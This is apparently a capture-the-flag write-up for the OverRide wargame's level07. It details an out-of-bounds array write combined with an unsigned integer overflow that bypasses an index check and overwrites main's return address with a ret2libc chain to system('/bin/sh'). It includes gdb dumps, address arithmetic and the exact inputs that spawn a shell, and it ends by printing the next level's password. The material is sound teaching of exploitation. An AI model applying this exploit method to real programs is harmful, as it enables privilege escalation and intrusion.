# Level 07

<h3>source.c</h3>

```console
The source for this program is quite long
So i will not include it in this file, and can be check in the source.c directly if needed
```

<h3>Analysis</h3>

This is a program which allowed us to `store` and `read` number into the memory, for example below:

```console
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 1111
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 1111
 Completed read command successfully
Input command: quit
```

All of the function in this program is protected, appart from the storing and reading of the data.

It was stored in this way `data[index] = nb` where `data` is the array of numbers, `nb` and `index` are the input that we typed in

This way is very unsafe as the we could potentially store the `nb` into any `index` that we want to, and possibly into the `RET` address as well

Our goal will be to find the correct `index` to overwrite the `RET` and point to `system()` in `libc`

<h3>Exploit</h3>

Lets set a breakpoint at the start of every loop so we can analyze the state of the stack after every command

```
(gdb) break *0x08048854           -> breakpoint at `main()` at `the printf("Input command: ")`
Breakpoint 1 at 0x8048854
```

Now lets run the program and store some value into the stack

```console
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------


Breakpoint 1, 0x08048854 in main ()
(gdb) c
Continuing.
Input command: store
 Number: 1111                                     -> doesnt matter, but 1111 = 0x457 in hex, so we will look for this value in the stack
 Index: 1                                         -> store at the 1st index so we could know where is the start of the stack
 Completed store command successfully

Breakpoint 1, 0x08048854 in main ()
(gdb) i r                                         -> info register to look at the address of esp and ebp
eax            0x8048d4b	134516043
ecx            0x0	0
edx            0x0	0
ebx            0xffffd504	-11004
esp            0xffffd4e0	0xffffd4e0
ebp            0xffffd6c8	0xffffd6c8
esi            0xffffd69d	-10595
edi            0x8048d60	134516064
eip            0x8048854	0x8048854 <main+305>
eflags         0x286	[ PF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99

(gdb) x/124wx $esp
0xffffd4e0:	0x08048d88	0xffffd698	0xf7fcfac0	0xf7fdc714
0xffffd4f0:	0x00000098	0xffffffff	0xffffd7c8	0xffffd768
0xffffd500:	0x00000000	0x00000000	0x00000457	0x00000000   -> we found the 0x457 here at `0xffffd508` so this should be the index 1 of the `data`
0xffffd510:	0x00000000	0x00000000	0x00000000	0x00000000      since `0xffffd508` is index 1, the index 0 should be located at `0xffffd504`
[...]
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0xdf583a00
0xffffd6b0:	0xf7feb620	0x00000000	0x08048a09	0xf7fceff4
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0xf7e45513   -> base on info register, ebp is locatied at `0xffffd6c8`, and RET normally follow after
                                                                so the return address should be at `0xffffd6cc`
```

Now that we have the address of the `data` and the `RET` of the `main()`, lets calculate their distance

```console
(RET) - (data) = 0xffffd6cc - 0xffffd504 = 456
```

The distance between `data` and `RET` is `456 bytes` and since data contains `unsigned int` where each data is `4 bytes`, we need to divide the distance by 4 to get the index (456 / 4) = 114, lets try it!

```console
Input command: store
 Number: 1111
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Unfortunately inde 114 is not usable, this is due to inside the `store_number()` there is a protection `(index % 3 == 0)`

Since `114 % 3 = 0` the program will reject our input.

But since the input is readed by using `scanf("%u", &nb)`, which means that every number we give will be an `unsigned int`

We could profit from the `int overflow`!

```console
Target distance = 456 bytes
| 0000 0000 0000 0000 0000 0000 0000 0000 |
| 0000 0000 0000 0000 0000 0001 1100 1000 |

Overflow it by turn on the 33th bit and the value will become 4294967752
| 0000 0000 0000 0000 0000 0000 0000 0001 |
| 0000 0000 0000 0000 0000 0001 1100 1000 |

Now we need to divide it by 4 and it will become 1073741938
| 0000 0000 0000 0000 0000 0000 0000 0000 |
| 0100 0000 0000 0000 0000 0000 0111 0010 |

Since the int only care about the first 7 bits, we can ignore the rest
| 0000 0000 0000 0000 0000 0000 0000 0000 |
| 0100 0000 0000 0000 0000 0000 0111 0010 |
                    |
| igno|0000 0000 0000 0000 0000 0111 0010 |

0000 0000 0000 0000 0000 0111 0010 = 114
```

From the calculation above, we can see that by giving `1073741938` as the `index`, it will be treated as `114`, lets test it!

```console
Input command: store
Number: 1111
Index: 1073741938
Completed store command successfully

(gdb) x/124wx $esp
0xffffd4e0:	0x08048d88	0xffffd698	0xf7fcfac0	0xf7fdc714
[...]
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000457  -> RET is succesfully written!
```

Great! we did it, all that is left is to get the `system()` and `/bin/sh`

```console
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

Now all the is left is to write `0xf7e6aed0 (4159090384)` to index `114 (1073741938)` and `0xf7f897ec (4160264172)` into index `116`

```console
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

